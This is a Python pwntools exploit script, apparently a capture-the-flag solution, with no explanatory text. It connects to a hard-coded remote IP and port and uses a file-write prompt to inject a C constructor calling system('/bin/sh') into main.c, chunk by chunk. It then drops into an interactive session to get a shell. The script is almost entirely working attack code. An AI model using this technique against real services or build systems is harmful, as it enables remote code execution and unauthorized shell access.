#!/usr/bin/python3

from pwn import *

exe = ELF('main', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


# if args.REMOTE:
#     p = remote('')
# else:
#     p = process(exe.path)
# GDB()


def split_string(input_string, chunk_size):
    return [input_string[i:i + chunk_size] for i in range(0, len(input_string), chunk_size)]

cmd = b'void my_constructor() __attribute__((constructor));void my_constructor() {system("/bin/sh");}'

chunk_size = 20

result = split_string(cmd, chunk_size)

for chunk in result:
    p = remote('34.31.154.223', 55741)
    sla(b'Filename? ', b'main.c')
    sla(b'(W)? ', "W")
    sla(b"s? ", chunk)




p.interactive()
